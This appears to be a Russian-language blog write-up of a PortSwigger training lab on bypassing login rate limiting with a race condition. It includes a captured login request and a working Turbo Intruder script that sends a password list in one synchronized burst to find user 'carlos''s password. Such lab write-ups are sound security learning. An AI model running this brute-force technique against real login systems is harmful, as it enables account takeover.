---
title: "Bypassing rate limits via race conditions"
date: 2025-11-20
tags: [web, writeup, race-conditions]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/race-conditions/race-conditions-detecting-and-exploiting-with-turbo-intruder/race-conditions/lab-race-conditions-bypassing-rate-limits"
classes: wide
---																								

Данная лаба содержит защиту от брутфорса, но это можно обойти с помощью уязвимости `Race condition`. Для решения нужно получить пароль от аккаунта пользователя `carlos` и удалить его.

```
https://0a0d00fd03552cc28082306900f6007f.web-security-academy.net/
```

# Solution

Пойду сразу пытаться логиниться, так как вот эта хрень меня смущает)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_rc/IMG_bypassing-rate-limits/1.png){: height="200" .align-center}

Итак, сперва я решил, теперь буду писать... Но конкурс "угнать за 15 минут" мне понравился. Повторять конечно же я не буду, но все же)

Я знаю из условия, что стоит защита от брутфорса)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_rc/IMG_bypassing-rate-limits/2.png){: height="200" .align-center}

Если защита реализована с ошибкой, то с помощью `Race condition` можно ее обойти. То есть мне нужно отправить одновременно запрос на логин с разными паролями. Если пароль верный, то меня должно перенаправить на другую страницу, а значит я получу статус-код `302`.

Сам запрос выглядит вот так:

```http
POST /login HTTP/2
Host: 0a0d00fd03552cc28082306900f6007f.web-security-academy.net
Cookie: session=zCmdqjv5nLgRNEeKMRgQ70BtlocXP9DN
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0d00fd03552cc28082306900f6007f.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: https://0a0d00fd03552cc28082306900f6007f.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=IHpetWdnMCo2y0Gok4QfzVJDnAUH0PEO&username=carlos&password=aoeuao
```

`Burp` предлагает использовать [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) для решения, что я и сделаю:

```python
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py

passwords = """
123123
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
1234567890
michael
x654321
superman
1qaz2wsx
baseball
7777777
121212
000000
""".split('\n')

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    for word in passwords:
        engine.queue(target.req, word.rstrip(), gate='1')

    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

Список паролей я взял из задачи. Я так понял, что для атаки нужно установить следующие значения: `engine=Engine.BUPR2` и `concurrentConnections=1`.

В данном коде я собираю группу запросов с разными паролями для каждого запроса. В качестве группы указывается `gate` равный `1`:

```python
for word in passwords:
    engine.queue(target.req, word.rstrip(), gate='1')
```

Далее все эти запросы отправляются с помощью `engine.openGate('1')`. В полученных ответах я вижу нужные мне с кодом `302`:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_rc/IMG_bypassing-rate-limits/3.png){: height="200" .align-center}

Использую пароль, чтобы залогиниться:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_rc/IMG_bypassing-rate-limits/4.png){: height="200" .align-center}

В панеле администратора удаляю нужный аккаунт. Лаба пройдена. Угнал получается...

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_rc/IMG_bypassing-rate-limits/5.png){: height="200" .align-center}